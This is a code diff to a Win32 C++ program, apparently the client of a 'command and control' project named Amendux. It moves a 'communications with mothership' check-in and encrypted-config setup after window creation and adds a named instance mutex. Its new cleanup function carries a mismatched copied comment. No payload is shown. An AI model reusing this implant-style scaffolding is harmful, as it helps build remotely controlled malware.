@@ -16,12 +16,14 @@ Amendux::Candcel Commander;						// Command and Control
 
 // Global Variables:
 HINSTANCE hInst;                                // Current instance
+HANDLE hMutex;									// Instance mutx lock
 WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
 WCHAR szWindowClass[MAX_LOADSTRING];            // The main window class name
 
 // Forward declarations of functions included in this code module:
 ATOM                MainRegisterClass(HINSTANCE hInstance);
 bool                InitInstance(HINSTANCE, int);
+bool                CleanupInstance();
 LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
 INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
 INT_PTR CALLBACK    Debug(HWND, UINT, WPARAM, LPARAM);
@@ -29,16 +31,6 @@ INT_PTR CALLBACK    Debug(HWND, UINT, WPARAM, LPARAM);
 int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
 {
     UNREFERENCED_PARAMETER(hPrevInstance);
-
-	// Plant the seed
-	srand((unsigned int)time(NULL));
-
-	// Initialize and configure instance
-	Amendux::Log::Init();
-	Amendux::Config::Init(FileCrypt);
-
-	// Establish communications with mothership
-	Commander.isAlive();
 
     // Initialize global strings
     LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
@@ -49,6 +41,16 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
     if (!InitInstance(hInstance, nCmdShow)) {
         return false;
     }
+
+	// Plant the seed
+	srand((unsigned int)time(NULL));
+
+	// Initialize and configure instance
+	Amendux::Log::Init();
+	Amendux::Config::Init(FileCrypt);
+
+	// Establish communications with mothership
+	Commander.isAlive();
 
 	// Window accelerators
     HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WIN32PROJECT1));
@@ -69,16 +71,17 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
         }
     }
 
-	// Terminate all instances
-	//Amendux::Config::Terminate();
-	//Amendux::Log::Terminate();
+	// Perform application cleanup
+	if (!CleanupInstance()) {
+		return false;
+	}
 
     return (int) msg.wParam;
 }
 
 
 //
-//  FUNCTION: MyRegisterClass()
+//  FUNCTION: MainRegisterClass()
 //
 //  PURPOSE: Registers the window class.
 //
@@ -117,6 +120,13 @@ ATOM MainRegisterClass(HINSTANCE hInstance)
 bool InitInstance(HINSTANCE hInstance, int nCmdShow)
 {
    hInst = hInstance; // Store instance handle in our global variable
+   hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, L"avcmtx");
+
+   if (!hMutex) {
+	   hMutex = CreateMutex(0, 0, L"avcmtx");
+   } else {
+	   return false;
+   }
 
    HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
       CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
@@ -131,6 +141,23 @@ bool InitInstance(HINSTANCE hInstance, int nCmdShow)
    return true;
 }
 
+
+//
+//   FUNCTION: CleanupInstance()
+//
+//   PURPOSE: Saves instance handle and creates main window
+//
+//   COMMENTS:
+//
+//        In this function, we save the instance handle in a global variable and
+//        create and display the main program window.
+//
+bool CleanupInstance()
+{
+	ReleaseMutex(hMutex);
+
+	return true;
+}
 
 //
 //  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
